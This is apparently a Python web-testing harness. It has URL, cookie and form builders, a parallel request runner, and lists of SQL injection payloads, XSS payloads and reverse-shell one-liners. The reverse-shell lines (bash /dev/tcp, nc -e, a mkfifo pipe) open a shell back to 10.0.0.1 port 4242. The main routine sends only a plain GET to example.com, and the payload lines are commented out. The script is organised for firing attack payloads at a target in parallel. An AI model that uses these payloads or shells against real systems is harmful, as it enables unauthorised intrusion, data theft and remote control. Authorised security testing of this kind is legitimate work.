import requests
import urllib.parse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed


def construct_url(url_object):
    parameters = url_object.get("parameters", {})
    path = url_object.get("path", "/")
    protocol = url_object.get("protocol", "https")
    domain = url_object.get("domain", "")
    port = url_object.get("port", 443)
    
    params_str = urllib.parse.urlencode(parameters)
    if params_str:
        return f"{protocol}://{domain}:{port}{path}?{params_str}"
    else:
        return f"{protocol}://{domain}:{port}{path}"

def construct_cookies(cookie_object):
    cookies_arr = []
    for cookie_name, cookie_value in cookie_object.items():
        cookies_arr.append(f"{cookie_name}={cookie_value}")
    return "; ".join(cookies_arr)

def construct_x_www_form_urlencoded(body_object):
    return urllib.parse.urlencode(body_object)

def execute_parallel_requests(request_func, payloads, max_workers=10):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_payload = {executor.submit(request_func, payload): payload 
                            for payload in payloads}
        for future in as_completed(future_to_payload):
            payload = future_to_payload[future]
            try:
                response = future.result()
                results.append((payload, response))
            except Exception as e:
                results.append((payload, f"Error: {str(e)}"))
    return results

sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
]

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]

reverse_shell_payloads = [
    "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
    "nc -e /bin/sh 10.0.0.1 4242",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f",
]

def request_1(
    url_object,
    method,
    headers,
    cookies,
    authorization,
    body,
    files,
    common_headers,
    timeout=30,
    verify_ssl=True,
    proxies=None,
):
    url = construct_url(url_object)
    h = {**common_headers, **headers}
    
    response = requests.request(
        url=url,
        method=method,
        headers=h,
        allow_redirects=False,
        timeout=timeout,
        verify=verify_ssl,
        proxies=proxies,
    )
    return response

def main():
    common_headers = {"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Platform": "\"macOS\"", "Sec-Ch-Ua-Mobile": "?0"}
    
    # payloads = sqli_payloads
    # payloads = xss_payloads
    # payloads = reverse_shell_payloads
    
    method_1 = "GET"
    headers_1 = {}
    url_1 = {
        "domain": "example.com",
        "protocol": "https",
        "port": 443,
        "path": "/",
        "parameters": {},
    }
    res_1 = request_1(
        url_1,
        method_1,
        headers_1,
        None,
        None,
        None,
        None,
        common_headers,
    )
    # print(res_1)

if __name__ == "__main__":
    main()
